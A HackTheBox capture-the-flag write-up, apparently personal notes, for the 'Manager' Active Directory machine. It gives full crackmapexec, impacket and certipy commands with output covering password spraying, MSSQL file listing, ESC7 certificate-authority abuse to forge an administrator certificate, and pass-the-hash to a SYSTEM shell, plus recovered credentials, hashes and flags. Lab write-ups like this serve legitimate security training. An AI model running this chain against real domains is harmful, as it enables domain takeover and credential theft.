## HacktheBox
This will be my first and ever Active Directory Box
**Ressources**
`https://n1chr0x.medium.com/hacking-with-ease-pass-the-hash-attack-made-simple-with-crackmapexec-b2e59b914f92`
`Outils et compétences requises :
Vous aurez besoin d'outils comme Nmap, Wireshark, BloodHound, PowerSploit, Mimikatz, CrackMapExec, Impacket, etc., pour 	nalyser, scanner et attaquer AD.
Des compétences en PowerShell et en scripting sont également utiles, car de nombreuses activités liées à AD sont
automatisées à l'aide de scripts.`

## Enumeration
```
└─# nmap -sT -sC -Pn 10.10.11.236 
Host is up (1.5s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
|_http-title: Manager
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2023-10-23T04:51:29+00:00; +6h59m54s from scanner time.
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
|_ssl-date: 2023-10-23T04:51:20+00:00; +6h59m54s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
1433/tcp open  ms-sql-s
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-10-23T04:52:08+00:00; +6h59m55s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-10-22T17:05:12
|_Not valid after:  2053-10-22T17:05:12
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2023-10-23T04:51:20+00:00; +6h59m54s from scanner time.

Host script results:
|_clock-skew: mean: 6h59m53s, deviation: 0s, median: 6h59m53s
| smb2-time: 
|   date: 2023-10-23T04:51:22
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Nmap done: 1 IP address (1 host up) scanned in 771.60 seconds

```
Ok so now i found this domain using nmap `dc01.manager.htb` i will add it on my `/etc/hosts`
i visit the website, but found nothing 
Port `139, 445` open and i think it's `smb`, also found `ms-sql` open
## Bruteforce users
Let's try to brute force users using `rid-brute` and `crackmapexec`
`https://medium.com/@e.escalante.jr/active-directory-workshop-brute-forcing-the-domain-server-using-crackmapexec-pt-6-feab1c43d970`
`https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/`

```
└─# crackmapexec smb manager.htb -u anonymous -p "" --rid-brute
SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         manager.htb     445    DC01             [+] manager.htb\anonymous: 
SMB         manager.htb     445    DC01             [+] Brute forcing RIDs
SMB         manager.htb     445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         manager.htb     445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         manager.htb     445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         manager.htb     445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         manager.htb     445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         manager.htb     445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         manager.htb     445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         manager.htb     445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         manager.htb     445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         manager.htb     445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         manager.htb     445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         manager.htb     445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         manager.htb     445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         manager.htb     445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         manager.htb     445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         manager.htb     445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         manager.htb     445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         manager.htb     445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         manager.htb     445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         manager.htb     445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         manager.htb     445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         manager.htb     445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         manager.htb     445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

I found now some users, now i will copy `SidTypeUser` on a `users.txt` then crack password
Let's convert the list of users to lower case and write the result to the `passwords.txt` file.
```                                      
administrator
zhong
cheng
ryan
raven
jinwoo
chinhae
operator
```
```
└─# crackmapexec smb manager.htb -u sidtypeusers.txt -p sidtypepass.txt
└─# crackmapexec smb manager.htb -u sidtypeusers.txt -p sidtypepass.txt
SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         manager.htb     445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         manager.htb     445    DC01             [-] manager.htb\Operator:jinwoo STATUS_LOGON_FAILURE 
SMB         manager.htb     445    DC01             [-] manager.htb\Operator:chinhae STATUS_LOGON_FAILURE 
SMB         manager.htb     445    DC01             [+] manager.htb\Operator:operator 

```
after a long of failure i just `operator` user password. also The Operator user has access to `MSSQL`on port 1433/tcp
i will use `impacket-mssqlclient` to access on it
I do `-h` flag to get help on it
```
└─# impacket-mssqlclient -p 1433 -windows-auth -dc-ip 10.10.11.236 manager.htb/Operator:operator@manager.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> 
```

**Explore the Ms-SQL**
I use this ressources to navigate on it:
`https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server`
List directory
The `xp_dirtree` procedure in SQL Server is used to list the files and subdirectories in a specified directory. The command you provided attempts to use `xp_dirtree` to list the files and subdirectories in the `C:\inetpub\wwwroot\` directory.
```
SQL> EXEC xp_dirtree 'C:\inetpub\wwwroot\', 0, 1;
website-backup-27-07-23-old.zip
```
i found an backup file i need to get it
Now i will just download because it was on the root web directory
`http://manager.htb/website-backup-27-07-23-old.zip`
when i extract it i found :  
`.inflating: .old-conf.xml`
when i open it
```
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```
found a password of user `Raven`. Now i will check it on crackmapexec
```
┌──(root㉿1337)-[/home/…/CTFs/Boot2root/HacktheBox/Season]
└─# crackmapexec smb manager.htb -u Raven -p "R4v3nBe5tD3veloP3r\!123"
SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         manager.htb     445    DC01             [+] manager.htb\Raven:R4v3nBe5tD3veloP3r!123 
```
Wow it works
## Deep Dive
```
└─# crackmapexec smb manager.htb -u Raven -p "R4v3nBe5tD3veloP3r\!123" --shares
SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         manager.htb     445    DC01             [+] manager.htb\Raven:R4v3nBe5tD3veloP3r!123 
SMB         manager.htb     445    DC01             [+] Enumerated shares
SMB         manager.htb     445    DC01             Share           Permissions     Remark
SMB         manager.htb     445    DC01             -----           -----------     ------
SMB         manager.htb     445    DC01             ADMIN$                          Remote Admin
SMB         manager.htb     445    DC01             C$                              Default share
SMB         manager.htb     445    DC01             IPC$            READ            Remote IPC
SMB         manager.htb     445    DC01             NETLOGON        READ            Logon server share 
SMB         manager.htb     445    DC01             SYSVOL          READ            Logon server share 
```
## Privilege escalation
Verify certificates and the privileges to issue them using `certipy`:
`https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation`
`https://exploit-notes.hdks.org/exploit/windows/active-directory/ad-cs-pentesting/`

```
└─# certipy find -u raven@manager.htb  -p R4v3nBe5tD3veloP3r\!123 -dc-ip 10.10.11.236
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Saved BloodHound data to '20231023020114_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20231023020114_Certipy.txt'
[*] Saved JSON output to '20231023020114_Certipy.json'
```
and here i found a dangerous:
``` 
[!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions```
found : https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Domain-Privilege-Escalation.md#ESC7-Vulnerable-CA-ACL
```
Now Synchronise the time with the domain controller:
and then manual attack here : `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2`

```
└─# certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password R4v3nBe5tD3veloP3r\!123 -dc-ip 10.10.11.236
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'

# List templates
└─# certipy ca -ca 'manager-DC01-CA' -username raven@manager.htb -password R4v3nBe5tD3veloP3r\!123 -dc-ip 10.10.11.236 -enable-template 'SubCA'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```
If we have fulfilled the prerequisites for this attack, we can start by requesting a certificate based on the SubCA template.

```
└─# certipy req -username raven@manager.htb -password R4v3nBe5tD3veloP3r\!123 -ca 'manager-DC01-CA' -target 10.10.11.236 -template SubCA -upn administrator@manager.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 53
Would you like to save the private key? (y/N) y
[*] Saved private key to 53.key
[-] Failed to request certificate



└─# certipy ca -ca 'manager-DC01-CA' -issue-request 53 -username raven@manager.htb -password R4v3nBe5tD3veloP3r\!123
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate


└─# certipy req -username raven@manager.htb -password R4v3nBe5tD3veloP3r\!123 -ca "manager-DC01-CA" -target 10.10.11.236 -target 10.10.11.236 -retrieve 53
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 53
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '53.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
Now we get the TGT and pull the hash for you:
```
└─# certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'manager.htb' -dc-ip 10.10.11.236
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef

```

**Use psexec to log in as administrator with Pass-The-Hash:**
```
└─# impacket-psexec manager.htb/administrator@manager.htb  -hashes 'aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef' -dc-ip 10.10.11.236
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on manager.htb.....
[*] Found writable share ADMIN$
[*] Uploading file LsSKFMwN.exe
[*] Opening SVCManager on manager.htb.....
[*] Creating service dGEG on manager.htb.....
[*] Starting service dGEG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
C:\Windows\system32> whoami
nt authority\system
 Directory of C:\Users\Administrator\Desktop

09/28/2023  02:27 PM    <DIR>          .
09/28/2023  02:27 PM    <DIR>          ..
10/22/2023  10:25 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,141,904,896 bytes free

C:\Users\Administrator\Desktop> type root.txt
a910d3535f35ec14c25f669e4139f421


 Directory of C:\Users\Raven\Desktop

07/27/2023  08:24 AM    <DIR>          .
07/27/2023  08:24 AM    <DIR>          ..
10/22/2023  10:25 PM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,141,708,288 bytes free

C:\Users\Raven\Desktop> type user.txt
f54cefa417294a9af23927128a8d6927

```